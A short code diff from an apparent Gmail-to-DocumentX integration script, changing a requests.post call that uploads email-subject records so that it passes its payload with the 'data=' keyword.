@@ -18,7 +18,7 @@ while True:
                 'subject':'Unspecified',
                 'comments':'This record is automatically created by DocumentX Gmail Integration.'
             })
-            requests.post('https://apis.mcsrv.icu/upload',{
+            requests.post('https://apis.mcsrv.icu/upload',data={
                 'name':subject,
                 'subject':'Unspecified',
                 'comments':'This record is automatically created by DocumentX Gmail Integration.'
